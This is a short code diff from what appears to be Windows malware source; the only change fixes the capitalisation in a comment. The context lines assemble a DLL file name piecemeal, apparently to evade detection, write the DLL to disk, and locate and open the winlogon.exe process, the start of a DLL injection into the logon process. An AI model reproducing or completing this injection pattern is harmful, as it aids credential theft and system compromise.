@@ -13,7 +13,7 @@ int main()
 	sprintf(dllPath, "%s\\%s.%cl%c", directoryPath, "winad", 'd', 'l');
 	success = Helper::CreateDllFile(dllPath);
 	if (success) {
-		// Finding winlogon.exe process Id
+		// Finding winlogon.exe process ID
 		DWORD dwPID = Helper::FindPID();
 		if (dwPID) {
 			// Getting a handle to winlogon.exe
